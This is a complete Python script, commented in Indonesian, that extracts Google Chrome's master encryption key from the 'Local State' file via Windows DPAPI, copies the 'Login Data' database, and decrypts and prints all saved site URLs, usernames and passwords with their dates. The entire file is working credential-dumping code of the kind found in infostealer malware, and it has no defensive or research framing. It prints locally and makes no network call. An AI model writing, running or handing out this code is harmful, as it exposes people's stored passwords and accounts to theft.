import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

# Fungsi untuk mengonversi format tanggal dan waktu Chrome ke objek datetime Python
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

# Fungsi untuk mendapatkan kunci enkripsi dari file "Local State" dalam instalasi Chrome
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # Mendekode kunci enkripsi dari base64
    key = base64.b64decode(local_state['os_crypt']["encrypted_key"])
    # Hapus DPAPI str
    key = key[5:]
    # Mengembalikan kunci yang telah dideskripsi yang awalnya dienkripsi
    # Menggunakan kunci sesi yang berasal dari kredensial masuk pengguna saat ini
    # Dokumentasi: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# Fungsi untuk mendekripsi kata sandi yang dienkripsi dalam basis data Chrome
def decrypted_password(password, key):
    try:
        # Dapatkan vektor inisialisasi
        iv = password[3:15]
        password = password[15:]
        # Hasilkan sandi
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # Dekripsi kata sandi
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # Tidak didukung
            return ""

# Fungsi utama untuk mengekstrak dan menampilkan informasi login dari basis data Chrome
def main():
    # Dapatkan kunci AES
    key = get_encryption_key()
    # Path basis data lokal Chrome SQLite
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # Salin file ke lokasi lain karena basis data akan terkunci jika Chrome sedang berjalan
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # Terhubung ke basis data
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # Tabel `logins` berisi data yang diperlukan
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # Iterasi semua baris
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypted_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"URL Asal: {origin_url}")
            print(f"URL Aksi: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Tanggal Pembuatan: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Terakhir Digunakan: {str(get_chrome_datetime(date_last_used))}")
        print("=" * 50)
    cursor.close()
    db.close()
    try:
        # Coba hapus file basis data yang disalin
        os.remove(filename)
    except:
        pass

# Jalankan fungsi utama jika skrip dijalankan secara langsung
if __name__ == "__main__":
    main()
